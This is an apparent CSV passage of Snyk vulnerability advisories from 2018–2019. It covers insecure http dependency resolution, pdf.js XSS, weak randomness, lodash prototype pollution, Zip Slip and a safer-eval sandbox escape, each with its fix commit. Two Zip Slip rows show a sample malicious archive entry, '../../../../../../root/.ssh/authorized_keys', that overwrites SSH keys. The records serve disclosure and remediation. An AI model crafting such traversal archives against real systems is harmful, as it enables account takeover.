Closes #2022",Unknown,5.6,medium,"org.testng:testng is a testing framework for the JVM.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
CVE-2018-5158,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-PDFJSDIST-469200,26/09/2019,11/06/2018,https://github.com/mozilla/pdf.js/commit/2dc4af525d1612c98afcd1e6bee57d4788f78f97,Cross-site Scripting (XSS),https://api.github.com/repos/mozilla/pdf.js/commits/2dc4af525d1612c98afcd1e6bee57d4788f78f97,Brendan Dahl,brendan.dahl@gmail.com,pdf.js,2dc4af525d1612c98afcd1e6bee57d4788f78f97,"Merge pull request #9659 from yurydelendik/rm-createFromIR

Remove createFromIR from PDFFunctionFactory",JavaScript,7.1,high,"pdfjs-dist is a Portable Document Format (PDF) library that is built with HTML5.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The PDF viewer does not sufficiently sanitize PostScript calculator functions, allowing malicious JavaScript to be injected through a crafted PDF file. This JavaScript can then be run with the permissions of the PDF viewer by its worker.",2019
CVE-2019-10755,CWE-338,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGPAC4J-467407,20/09/2019,20/09/2019,https://github.com/pac4j/pac4j/commit/34d5b1028a2db201ee81ec51b52a782fe073f609,Insecure Randomness,https://api.github.com/repos/pac4j/pac4j/commits/34d5b1028a2db201ee81ec51b52a782fe073f609,Jérôme LELEU,leleuj@gmail.com,pac4j,34d5b1028a2db201ee81ec51b52a782fe073f609,Remove RandomStringUtils,Java,2.7,low,"org.pac4j:pac4j-saml is an is PAC4J package for the SAML Protocol.
Affected versions of this package are vulnerable to Insecure Randomness. A insecure source of randomness is used to generate all of its random values as it relies upon apache commons lang3 RandomStringUtils. This  SAML identifier generated within SAML2Utils.java was found to make use of this class. Note: This issue only affects the 3.X release of pac4j-saml.",2019
CVE-2019-10754,CWE-338,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPEREOCAS-468869,20/09/2019,20/09/2019,https://github.com/apereo/cas/commit/40bf278e66786544411c471de5123e7a71826b9f,Insecure Randomness,https://api.github.com/repos/apereo/cas/commits/40bf278e66786544411c471de5123e7a71826b9f,Misagh Moayyed,mm1844@gmail.com,cas,40bf278e66786544411c471de5123e7a71826b9f,change generation of rnd numbers,Java,8.1,high,"org.apereo.cas:cas-server-support-oidc is a package that allows allows CAS to act as an OpenId Connect Provider (OP).
Affected versions of this package are vulnerable to Insecure Randomness. A insecure source of randomness is used to generate all of its random values as it relies upon apache commons lang3 RandomStringUtils. This could allow an attacker to possibly generate their own unique  Ticket ID due to insufficient randomness.",2019
CVE-2019-10754,CWE-338,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPEREOCAS-467404,20/09/2019,20/09/2019,https://github.com/apereo/cas/commit/40bf278e66786544411c471de5123e7a71826b9f,Insecure Randomness,https://api.github.com/repos/apereo/cas/commits/40bf278e66786544411c471de5123e7a71826b9f,Misagh Moayyed,mm1844@gmail.com,cas,40bf278e66786544411c471de5123e7a71826b9f,change generation of rnd numbers,Java,8.1,high,"org.apereo.cas:cas-server-support-shell is a package for the CAS command-line shell provides the ability to query the CAS server for help on available settings/modules and various other utility functions.
Affected versions of this package are vulnerable to Insecure Randomness. A insecure source of randomness is used to generate all of its random values as it relies upon apache commons lang3 RandomStringUtils. This could allow an attacker to possibly generate their own unique  Ticket ID due to insufficient randomness.",2019
CVE-2019-10754,CWE-338,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPEREOCAS-467406,20/09/2019,20/09/2019,https://github.com/apereo/cas/commit/40bf278e66786544411c471de5123e7a71826b9f,Insecure Randomness,https://api.github.com/repos/apereo/cas/commits/40bf278e66786544411c471de5123e7a71826b9f,Misagh Moayyed,mm1844@gmail.com,cas,40bf278e66786544411c471de5123e7a71826b9f,change generation of rnd numbers,Java,8.1,high,"org.apereo.cas:cas-server-support-oauth-core-api is a CAS Server Support OAuth Core API for supporting OAuth within Apereo CAS.
Affected versions of this package are vulnerable to Insecure Randomness. A insecure source of randomness is used to generate all of its random values as it relies upon apache commons lang3 RandomStringUtils. This could allow an attacker to possibly generate their own unique  Ticket ID due to insufficient randomness.",2019
CVE-2019-10754,CWE-338,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPEREOCAS-467402,20/09/2019,20/09/2019,https://github.com/apereo/cas/commit/40bf278e66786544411c471de5123e7a71826b9f,Insecure Randomness,https://api.github.com/repos/apereo/cas/commits/40bf278e66786544411c471de5123e7a71826b9f,Misagh Moayyed,mm1844@gmail.com,cas,40bf278e66786544411c471de5123e7a71826b9f,change generation of rnd numbers,Java,8.1,high,"org.apereo.cas:cas-server-support-simple-mfa is an is package that allows Apereo CAS to act as a multifactor authentication provider on its own, issuing tokens and sending them to end-users via pre-defined communication channels such as email or text messages.
Affected versions of this package are vulnerable to Insecure Randomness. A insecure source of randomness is used to generate all of its random values as it relies upon apache commons lang3 RandomStringUtils. This could allow an attacker to possibly generate their own unique  Ticket ID due to insufficient randomness.",2019
CVE-2019-10754,CWE-338,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPEREOCAS-468868,20/09/2019,20/09/2019,https://github.com/apereo/cas/commit/40bf278e66786544411c471de5123e7a71826b9f,Insecure Randomness,https://api.github.com/repos/apereo/cas/commits/40bf278e66786544411c471de5123e7a71826b9f,Misagh Moayyed,mm1844@gmail.com,cas,40bf278e66786544411c471de5123e7a71826b9f,change generation of rnd numbers,Java,8.1,high,"org.apereo.cas:cas-server-core-services-api is a library used within Apereo CAS for Apereo CAS Core Services API.
Affected versions of this package are vulnerable to Insecure Randomness. A insecure source of randomness is used to generate all of its random values as it relies upon apache commons lang3 RandomStringUtils. This could allow an attacker to possibly generate their own unique  Ticket ID due to insufficient randomness.",2019
,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMPAYPALTOOLS-174791,11/06/2019,22/02/2019,https://github.com/paypal/Gibberish-Detector-Java/commit/8bb3484b2ee90bcec9f3d7adc2c861d27bf58cf7,Unsafe Dependency Resolution,https://api.github.com/repos/paypal/Gibberish-Detector-Java/commits/8bb3484b2ee90bcec9f3d7adc2c861d27bf58cf7,Eyal Allweil,eallweil@paypal.com,Gibberish-Detector-Java,8bb3484b2ee90bcec9f3d7adc2c861d27bf58cf7,"Fix security bug in repository definitions

Replace http url with https",XML,5.6,medium,"com.paypal.tools:Gibberish-Detector is a small program to detect gibberish using a Markov Chain.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IODROPWIZARD-174793,11/06/2019,22/02/2019,https://github.com/dropwizard/dropwizard/commit/3330d54f9d27c56f6d6aa68be14451f9ca4e0e1d,Unsafe Dependency Resolution,https://api.github.com/repos/dropwizard/dropwizard/commits/3330d54f9d27c56f6d6aa68be14451f9ca4e0e1d,Justin Plock,jplock@users.noreply.github.com,dropwizard,3330d54f9d27c56f6d6aa68be14451f9ca4e0e1d,"Merge pull request #2665 from nickbabcock/sona-example

Remove sonatype snapshots from dropwizard-example",XML,5.6,medium,"io.dropwizard:dropwizard-example is a simple library for building production-ready RESTful web services.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
CVE-2019-10240,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGECLIPSEHAWKBIT-174824,11/06/2019,22/02/2019,https://github.com/eclipse/hawkbit/commit/fa6520a094a24897035dae4a3af2a69d174c7f9d,Unsafe Dependency Resolution,https://api.github.com/repos/eclipse/hawkbit/commits/fa6520a094a24897035dae4a3af2a69d174c7f9d,Kai Zimmermann,kai.zimmermann@microsoft.com,hawkbit,fa6520a094a24897035dae4a3af2a69d174c7f9d,"Fix Vaadin Addon repo url (#813)

Signed-off-by: Kai Zimmermann <kai.zimmermann@microsoft.com>",XML,5.6,medium,"org.eclipse.hawkbit:hawkbit-parent is a domain independent back end solution for rolling out software updates to constrained edge devices as well as more powerful controllers and gateways connected to IP based networking infrastructure.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
CVE-2019-10249,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGECLIPSEXTEXT-174786,11/06/2019,22/02/2019,https://github.com/eclipse/xtext-maven/commit/81080879cfda4474a2ab161599ca6cb46ebcc077,Unsafe Dependency Resolution,https://api.github.com/repos/eclipse/xtext-maven/commits/81080879cfda4474a2ab161599ca6cb46ebcc077,Christian Dietrich,christian.dietrich@itemis.de,xtext-maven,81080879cfda4474a2ab161599ca6cb46ebcc077,"[#74] use https to access typefox jenkins

Signed-off-by: Christian Dietrich <christian.dietrich@itemis.de>",Markdown,5.6,medium,"org.eclipse.xtext:org.eclipse.xtext.maven.parent is a framework for development of programming languages and domain-specific languages.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGIMMUTABLES-174828,11/06/2019,22/02/2019,https://github.com/immutables/immutables/commit/909fd91fe6065e785f88a31a506554cec2ad7ee4,Unsafe Dependency Resolution,https://api.github.com/repos/immutables/immutables/commits/909fd91fe6065e785f88a31a506554cec2ad7ee4,Eugene Lukash,e.lucash@gmail.com,immutables,909fd91fe6065e785f88a31a506554cec2ad7ee4,"use https for the spring-milestones repo

fixes #919",XML,5.6,medium,"org.immutables:value-fixture is a processor to create immutable objects and builders.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMBEUST-174815,11/06/2019,22/02/2019,https://github.com/cbeust/jcommander/commit/3ae95595febbed9c13f367b6bda5c0be1c572c53,Unsafe Dependency Resolution,https://api.github.com/repos/cbeust/jcommander/commits/3ae95595febbed9c13f367b6bda5c0be1c572c53,Cedric Beust,cedric@beust.com,jcommander,3ae95595febbed9c13f367b6bda5c0be1c572c53,https in build.gradle,Config files,5.6,medium,"com.beust:jcommander is a Command line parsing framework for Java.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In the case that any of these artifacts were compromised, any developers using them could be vulnerable.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that all of the artifacts published to the registry were not altered. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on their build to verify they had not been compromised.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"lodash.merge is a Lodash method _.merge exported as a Node.js module.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SAILSHQLODASH-460131,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"@sailshq/lodash is a fork of Lodash 3.10.x with ongoing maintenance from the Sails core team.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHMERGEWITH-174136,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"lodash.mergewith is a Lodash method _.mergewith exported as a Node.js module.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHDEFAULTSDEEP-450199,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"lodash.defaultsdeep is a Lodash method _.defaultsDeep exported as a Node.js module.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHES-2434287,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASH-73638,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"lodash is a modern JavaScript utility library delivering modularity, performance, & extras.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-LODASHRAILS-559448,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"lodash-rails is a lodash for the Rails asset pipeline.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-LODASH-540455,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"lodash is an utility library delivering consistency, modularity, performance, & extras.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2019-5484,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JS-BOWER-73627,25/01/2019,24/01/2019,https://github.com/bower/bower/commit/45c6bfa86f6e57731b153baca9e0b41a1cc699e3,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/bower/bower/commits/45c6bfa86f6e57731b153baca9e0b41a1cc699e3,Adam Stankiewicz,sheerun@sher.pl,bower,45c6bfa86f6e57731b153baca9e0b41a1cc699e3,Fix .tar.gz extract vulnerability,JavaScript,8.0,high,"bower offers a generic, unopinionated solution to the problem of front-end package management.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).
Attackers can write arbitrary files when a malicious archive is extracted.",2019
CVE-2019-10743,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVERCMDARC-174728,16/05/2019,13/05/2019,https://github.com/mholt/archiver/commit/8217ed3a206c0473b4ec1aff51375b398838073a,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/mholt/archiver/commits/8217ed3a206c0473b4ec1aff51375b398838073a,giuliocomi,giulio1.comi@mail.polimi.it,archiver,8217ed3a206c0473b4ec1aff51375b398838073a,Prevent arbitrary file overwrite via path traversal (Zip Slip attack),Go,5.5,medium,"github.com/mholt/archiver/cmd/arc is a cross-platform, multi-format archive utility and Go library.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) via the Unarchive functions.",2019
CVE-2019-10743,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVERV3CMDARC-1083919,16/05/2019,13/05/2019,https://github.com/mholt/archiver/commit/8217ed3a206c0473b4ec1aff51375b398838073a,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/mholt/archiver/commits/8217ed3a206c0473b4ec1aff51375b398838073a,giuliocomi,giulio1.comi@mail.polimi.it,archiver,8217ed3a206c0473b4ec1aff51375b398838073a,Prevent arbitrary file overwrite via path traversal (Zip Slip attack),Go,5.5,medium,"github.com/mholt/archiver/v3/cmd/arc is a cross-platform, multi-format archive utility and Go library.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) via the Unarchive functions.",2019
CVE-2018-8416,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-SYSTEMIOCOMPRESSIONZIPFILE-174570,02/05/2019,12/09/2018,https://github.com/dotnet/corefx/commit/a0fcd23ace1c8d692988cd0da4391cf7bf5e0ce6,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/dotnet/corefx/commits/a0fcd23ace1c8d692988cd0da4391cf7bf5e0ce6,Jeremy Kuhne,jeremy.kuhne@microsoft.com,corefx,a0fcd23ace1c8d692988cd0da4391cf7bf5e0ce6,"Fix extract out of directory (#32127)

* Fix extract out of directory

Without ensuring a trailing directory separator you cannot compare paths for nesting.  `/Foo/Bar` does not contain `/Foo/Barber`, but does contain `/Foo/Bar/Bell`. This adds the separator and tests.

* Skip new test on NetFX",C#,5.5,medium,"System.IO.Compression.ZipFile provides classes that support the compression and decompression of streams using file system paths.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).
An attacker could write arbitrary files and directories to certain locations on a vulnerable system. However, an attacker would have limited control over the destination of the files and directories. To exploit the vulnerability, they must send a specially crafted file to a vulnerable system.",2019
CVE-2019-10760,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-SAFEREVAL-473029,11/03/2019,08/03/2019,https://github.com/commenthol/safer-eval/commit/1c29f6a6e304fb650c05056e217e457a0d2cc3c5,Arbitrary Code Execution,https://api.github.com/repos/commenthol/safer-eval/commits/1c29f6a6e304fb650c05056e217e457a0d2cc3c5,commenthol,commenthol@gmail.com,safer-eval,1c29f6a6e304fb650c05056e217e457a0d2cc3c5,fix: disallow usage of Object.constructor,JavaScript,9.9,critical,"safer-eval is a safer approach for eval in node and browser.
Affected versions of this package are vulnerable to Arbitrary Code Execution. A payload using constructor properties can escape the sandbox and execute arbitrary code.",2019
CVE-2018-1002208,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-SHARPZIPLIB-60247,11/06/2018,11/06/2018,https://github.com/icsharpcode/SharpZipLib/commit/5376c2daf1c0e0665398dee765af2047e43146ca,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/icsharpcode/SharpZipLib/commits/5376c2daf1c0e0665398dee765af2047e43146ca,nils måsén,nils@piksel.se,SharpZipLib,5376c2daf1c0e0665398dee765af2047e43146ca,"Restrict path traversal on FastZip extraction (#235)

Fixes #232

- Prevent traversal outside of extraction directory
- Add new explicit exception for invalid names
- Add tests for extraction path traversal

Note: Use new parameter `allowParentTraversal` to re-enable past behaviour",C#,5.5,medium,"sharpziplib is a Zip, GZip, Tar and BZip2 library written entirely in C# for the .NET platform.
Affected versions of the package are vulnerable to Arbitrary File Write via Archive Extraction (AKA ""Zip Slip"").
It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a ""../../file.exe"" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:

+2018-04-15 22:04:29 ..... 19 19 good.txt

+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys",2018
CVE-2018-16487,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHBASEMERGE-450200,01/02/2019,31/08/2018,https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/90e6199a161b6445b01454517b40ef65ebecd2ad,John-David Dalton,john.david.dalton@gmail.com,lodash,90e6199a161b6445b01454517b40ef65ebecd2ad,Ensure Object.prototype is not augmented by _.merge.,JavaScript,7.3,high,"lodash._basemerge is a The internal Lo-Dash function baseMerge as a Node.js module generated by lodash-cli.
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.",2019
CVE-2019-5437,CWE-552,Snyk,https://security.snyk.io/vuln/SNYK-JS-HARP-174149,10/04/2019,09/04/2019,https://github.com/sintaxi/harp/commit/1ec790baeeb2bfdb4584f1998af3d10a8fa31210,Information Exposure,https://api.github.com/repos/sintaxi/harp/commits/1ec790baeeb2bfdb4584f1998af3d10a8fa31210,Brock Whitten,brock@sintaxi.com,harp,1ec790baeeb2bfdb4584f1998af3d10a8fa31210,Resolves serving private file via encoded underscore. #646,Config files,5.9,medium,"harp is a zero-configuration web server with built in pre-processing.
Affected versions of this package are vulnerable to Information Exposure. The documentation explicitly mentions that files or directories with names that start with an underscore are ignored by the server and are not served to the end user. By using simple URL encoding this verification is bypassed and files or directories that should be ignored are accessible.",2019
CVE-2018-8008,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTORM-32346,06/06/2018,05/05/2018,https://github.com/apache/storm/commit/1117a37b01a1058897a34e11ff5156e465efb692,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/apache/storm/commits/1117a37b01a1058897a34e11ff5156e465efb692,Robert Evans,evans@yahoo-inc.com,storm,1117a37b01a1058897a34e11ff5156e465efb692,STORM-3052: Allow for untar/unzip to work on older versions,Java,5.5,medium,"org.apache.storm:storm-core is a distributed realtime computation system.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).",2018
CVE-2018-8008,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTORM-73624,06/06/2018,05/05/2018,https://github.com/apache/storm/commit/1117a37b01a1058897a34e11ff5156e465efb692,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/apache/storm/commits/1117a37b01a1058897a34e11ff5156e465efb692,Robert Evans,evans@yahoo-inc.com,storm,1117a37b01a1058897a34e11ff5156e465efb692,STORM-3052: Allow for untar/unzip to work on older versions,Java,5.5,medium,"org.apache.storm:storm-server is a distributed realtime computation system.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).",2018
CVE-2018-1002205,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-DOTNETZIP-60245,31/05/2018,18/04/2018,https://github.com/haf/DotNetZip.Semverd/commit/8e79ed7dc17fe6d3c74c7ac1344b2aa60eb30039,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/haf/DotNetZip.Semverd/commits/8e79ed7dc17fe6d3c74c7ac1344b2aa60eb30039,Andreia Gaita,shana@spoiledcat.net,DotNetZip.Semverd,8e79ed7dc17fe6d3c74c7ac1344b2aa60eb30039,"Sanitize zip entry paths before extracting

Zip entries can contain relative paths that end up outside the extraction
directory if used as-is, for instance ""..\..\..\..\file.txt"", which can be
a potential security risk. This sanitizes all paths before extraction while
ensuring that valid relative paths are not lost.

- ""a\..\c\file.txt"" -> ""c\file.txt""
- ""a\..\..\c\file.txt"" -> ""c\file.txt""
- ""..\..\..\..\c\file.txt"" -> ""c\file.txt""
- ""a\b\..\c\file.txt"" -> ""a\c\file.txt""
- ""a\b\c\..\e\..\..\f\file.txt"" -> ""a\f\file.txt""",C#,5.5,medium,"dotnetzip is a class library and toolset for manipulating zip files. 
Affected versions of the package are vulnerable to Arbitrary File Write via Archive Extraction (AKA ""Zip Slip"").
It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a ""../../file.exe"" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:

+2018-04-15 22:04:29 ..... 19 19 good.txt

